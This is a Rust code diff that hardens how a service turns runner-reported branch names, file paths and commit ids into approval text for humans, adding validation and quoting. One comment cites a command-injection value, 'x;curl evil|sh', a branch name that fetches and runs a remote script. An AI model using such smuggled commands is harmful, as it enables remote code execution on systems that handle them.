@@ -43,11 +43,18 @@ pub fn permanent_refusal(reason: &str) -> bool {
 }
 
 fn cap(s: &str) -> String {
-    let s = s.split_whitespace().collect::<Vec<_>>().join(" ");
-    match s.char_indices().nth(REASON_MAX) {
-        Some((at, _)) => format!("{}…", &s[..at]),
-        None => s,
-    }
+    untrusted(s, REASON_MAX)
+}
+
+/// A repo-relative file name the summary may show: plain characters, no `..`, not absolute or
+/// option-like. Anything else a runner reports is dropped, never rendered.
+fn safe_path(f: &str) -> bool {
+    !f.is_empty()
+        && f.len() <= 200
+        && !f.starts_with(['/', '-'])
+        && !f.contains("..")
+        && f.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b"._/-".contains(&b))
 }
 
 /// The head the issue's branch in `repo` was last pushed at by a run (1.28), `None` before its
@@ -105,12 +112,24 @@ pub async fn push_reported(
         Some(name) => repos.into_iter().find(|r| r.name == name),
         None => repos.into_iter().next(),
     };
-    let branch = payload["branch"].as_str().unwrap_or("?");
+    // The branch is the issue's own, derived here: what the runner says is never trusted into
+    // text a human acts on (a name like `x;curl evil|sh` would be a command in the approval).
+    let branch_owned = crate::store::work::issue_branch_in(&mut tx, issue)
+        .await?
+        .filter(|b| ainkrad_proto::runner::branch_name_ok(b) && safe_path(b))
+        .unwrap_or_else(|| "(unknown branch)".to_owned());
+    let branch = branch_owned.as_str();
+    // A commit id is hex; anything else is no id.
+    let sha = payload["sha"]
+        .as_str()
+        .filter(|s| (4..=64).contains(&s.len()) && s.bytes().all(|b| b.is_ascii_hexdigit()));
     if kind == "branch_pushed" {
         // It is on the forge now: a held request may open, an unpushed one need not wait, and
         // a requested one is due at once (`pushed_sha`, `due_prs`).
         if let Some(repo) = repo {
-            let sha = payload["sha"].as_str().unwrap_or("");
+            let Some(sha) = sha else {
+                return tx.commit().await;
+            };
             // The branch's head now, whatever the PR's state: the next push leases on it (1.28).
             sqlx::query(
                 "INSERT INTO citadel_issue_pushed_heads (issue_id, repo_id, sha) VALUES (?, ?, ?) \
@@ -134,9 +153,16 @@ pub async fn push_reported(
         return tx.commit().await;
     }
     let reason = cap(payload["reason"].as_str().unwrap_or("no reason given"));
-    let files: Vec<&str> = payload["workflow_files"]
+    let files: Vec<String> = payload["workflow_files"]
         .as_array()
-        .map(|a| a.iter().filter_map(Value::as_str).collect())
+        .map(|a| {
+            a.iter()
+                .filter_map(Value::as_str)
+                .filter(|f| safe_path(f))
+                .take(20)
+                .map(str::to_owned)
+                .collect()
+        })
         .unwrap_or_default();
     let permanent = permanent_refusal(&reason);
     let workflow = workflow_refusal(&reason);
@@ -145,7 +171,6 @@ pub async fn push_reported(
         let error = format!("push rejected: {reason}");
         // A workflow refusal is held under the head, which is what its approval releases
         // (`workflow_decided_in`); any other refusal for good is held under its reason.
-        let sha = payload["sha"].as_str();
         let hold = match (workflow, sha) {
             (true, Some(sha)) => Some(sha),
             _ => permanent.then_some(reason.as_str()),
@@ -166,7 +191,6 @@ pub async fn push_reported(
         .await?;
     }
     if workflow {
-        let sha = payload["sha"].as_str();
         let listed = match files.is_empty() {
             true => "workflow files".to_owned(),
             false => files.join(", "),
@@ -191,7 +215,7 @@ pub async fn push_reported(
                 let summary = format!(
                     "Push {branch} by hand: the forge token may not change {listed}. From the \
                      issue's worktree on the runner, with credentials that have the workflow \
-                     scope: git push origin {branch}:{branch}; then approve, and the PR opens. \
+                     scope: git push origin '{branch}:{branch}'; then approve, and the PR opens. \
                      Reject to have the agent drop the workflow change."
                 );
                 let payload = json!({"summary": summary, "run": run, "branch": branch,
